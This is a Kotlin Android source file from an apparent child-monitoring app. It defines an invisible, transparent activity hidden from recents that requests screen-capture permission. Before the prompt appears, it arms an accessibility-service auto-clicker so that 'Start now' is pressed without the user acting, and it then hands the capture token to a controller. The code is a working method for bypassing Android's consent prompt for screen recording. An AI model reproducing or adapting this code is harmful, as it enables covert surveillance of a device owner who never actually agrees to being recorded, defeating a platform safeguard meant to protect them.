package com.nexus.child.components.screen

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.util.Log
import com.nexus.child.accessibility.MediaProjectionAutoClickHelper

/**
 * TransparentMediaProjectionActivity is an invisible, transient activity used to request
 * Android MediaProjection permission for screen monitoring.
 *
 * Hey friend! Here is why this activity is needed:
 * 1. Android's MediaProjectionManager.createScreenCaptureIntent() requires an Activity context
 *    to dispatch the intent via startActivityForResult.
 * 2. This activity has a completely transparent theme and is excluded from Android recents.
 * 3. Immediately before launching the system prompt, it arms MediaProjectionAutoClickHelper
 *    for 5 seconds so NexusAccessibilityService can click "Start now" without manual user intervention.
 * 4. Once onActivityResult fires with the result token, it delivers it to ScreenController and finishes immediately.
 */
class TransparentMediaProjectionActivity : Activity() {

    companion object {
        private const val TAG = "TransparentMediaProj"
        private const val REQUEST_CODE_MEDIA_PROJECTION = 1001

        /**
         * Helper to launch this transparent activity from a background service or controller.
         */
        fun launch(context: Context) {
            val intent = Intent(context, TransparentMediaProjectionActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d(TAG, "TransparentMediaProjectionActivity launched. Requesting screen capture intent...")

        try {
            // Start the foreground service required by Android 14+ for mediaProjection
            ScreenCaptureService.start(this)

            // Arm accessibility auto-click for 6 seconds
            MediaProjectionAutoClickHelper.enableAutoClick()

            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager
            if (mpm == null) {
                Log.e(TAG, "MediaProjectionManager not available")
                ScreenCaptureService.stop(this)
                ScreenController.onMediaProjectionDenied("MediaProjectionManager not available")
                finish()
                return
            }

            @Suppress("DEPRECATION")
            startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_CODE_MEDIA_PROJECTION)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start media projection intent: ${e.message}", e)
            ScreenCaptureService.stop(this)
            MediaProjectionAutoClickHelper.disableAutoClick()
            ScreenController.onMediaProjectionDenied("Failed to launch projection intent: ${e.message}")
            finish()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == REQUEST_CODE_MEDIA_PROJECTION) {
            if (resultCode == RESULT_OK && data != null) {
                Log.d(TAG, "MediaProjection permission granted (resultCode=$resultCode)")
                ScreenController.onMediaProjectionGranted(resultCode, data)
            } else {
                Log.w(TAG, "MediaProjection permission canceled or denied (resultCode=$resultCode)")
                ScreenCaptureService.stop(this)
                MediaProjectionAutoClickHelper.disableAutoClick()
                ScreenController.onMediaProjectionDenied("User or system canceled screen capture prompt")
            }
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "TransparentMediaProjectionActivity destroyed")
    }
}
